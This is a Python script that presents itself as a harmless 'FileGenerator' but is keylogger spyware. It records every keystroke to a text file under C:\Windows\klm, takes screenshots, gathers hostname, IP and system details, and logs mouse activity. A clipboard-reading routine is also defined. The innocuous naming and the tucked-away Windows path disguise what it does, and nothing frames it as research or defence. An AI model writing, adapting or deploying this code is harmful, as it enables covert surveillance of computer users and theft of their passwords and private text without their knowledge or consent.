import logging
import os
import platform
import socket
import time
import pyscreenshot
import pyperclip
from pynput import keyboard
from pynput.keyboard import Listener
import threading

# Shared settings
output_directory = "C:\\Windows\\klm\\output"
log_directory = "C:\\Windows\\klm\\logs"
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class FileGenerator:
    def __init__(self):
        self.log = "File Generation Started..."
        logging.info("FileGenerator initialized")

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        current_move = "Mouse moved to {} {}\n".format(x, y)
        self.appendlog(current_move)

    def on_click(self, x, y, button, pressed):
        current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key + "\n")
        self.save_log()

    def save_log(self):
        log_path = os.path.join(output_directory, "key_log.txt")
        with open(log_path, 'w') as log_file:
            log_file.write(self.log)
        logging.info(f"Key log saved to {log_path}")

    def get_clipboard_content(self, max_retries=5):
        for i in range(max_retries):
            try:
                return pyperclip.paste()
            except pyperclip.PyperclipException as e:
                self.appendlog(f"Error accessing clipboard (attempt {i+1}): {e}\n")
                time.sleep(1)  # Wait a bit before retrying
        return "Could not access clipboard"

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("Hostname: {}\n".format(hostname))
        self.appendlog("IP Address: {}\n".format(ip))
        self.appendlog("Processor: {}\n".format(plat))
        self.appendlog("System: {}\n".format(system))
        self.appendlog("Machine: {}\n".format(machine))
        self.save_log()

    def screenshot(self):
        try:
            img = pyscreenshot.grab()
            # Create a unique filename with the current date and time
            timestamp = time.strftime("%Y%m%d_%H%M%S", time.localtime())
            screenshot_path = os.path.join(output_directory, f"screenshot_{timestamp}.png")
            img.save(screenshot_path)
            logging.info(f"Screenshot saved to {screenshot_path}")
        except Exception as e:
            self.appendlog("Failed to take screenshot: {}\n".format(e))
            logging.error(f"Failed to take screenshot: {e}")

    def run(self):
        # Take a screenshot initially
        self.screenshot()

        # Capture system information
        self.system_information()

        # Start the keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

if __name__ == "__main__":
    file_generator = FileGenerator()
    file_generator.run()
